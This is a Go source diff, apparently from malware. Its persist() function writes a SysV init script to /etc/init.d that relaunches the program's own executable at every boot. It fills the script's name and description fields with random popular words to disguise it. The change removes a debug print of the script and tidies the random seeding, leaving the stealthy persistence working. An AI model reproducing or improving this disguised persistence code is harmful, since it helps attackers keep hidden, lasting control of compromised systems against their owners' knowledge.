@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"os"
 	"time"
 )
@@ -48,6 +47,8 @@ func persist() error {
 			return err
 		}
 
+		currentTime := time.Now().UnixNano()
+
 		scriptContent := "#! /bin/sh"
 		scriptContent += "\n### BEGIN INIT INFO"
 		scriptContent += "\n# Provides:          " + randomPopularWord()
@@ -56,21 +57,19 @@ func persist() error {
 		scriptContent += "\n# Default-Start:     2 3 4 5"
 		scriptContent += "\n# Default-Stop:"
 		scriptContent += "\n# Short-Description: "
-		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()) + " "
-		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-2) + " "
-		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-4) + " "
-		scriptContent += randomPopularWordBySeed(time.Now().UnixNano() - 6)
+		scriptContent += randomPopularWordBySeed(currentTime) + " "
+		scriptContent += randomPopularWordBySeed(currentTime-2) + " "
+		scriptContent += randomPopularWordBySeed(currentTime-4) + " "
+		scriptContent += randomPopularWordBySeed(currentTime - 6)
 		scriptContent += "\n# Description:       "
-		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-8) + " "
-		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-16) + " "
-		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-32) + " "
-		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-64) + " "
-		scriptContent += randomPopularWordBySeed(time.Now().UnixNano()-128) + " "
-		scriptContent += randomPopularWordBySeed(time.Now().UnixNano() - 256)
+		scriptContent += randomPopularWordBySeed(currentTime-8) + " "
+		scriptContent += randomPopularWordBySeed(currentTime-16) + " "
+		scriptContent += randomPopularWordBySeed(currentTime-32) + " "
+		scriptContent += randomPopularWordBySeed(currentTime-64) + " "
+		scriptContent += randomPopularWordBySeed(currentTime-128) + " "
+		scriptContent += randomPopularWordBySeed(currentTime - 256)
 		scriptContent += "\n### END INIT INFO"
 		scriptContent += "\n\n../.." + executablePath
-
-		fmt.Println(scriptContent)
 
 		_, err = os.Stat("/etc/init.d")
 		if err != nil {
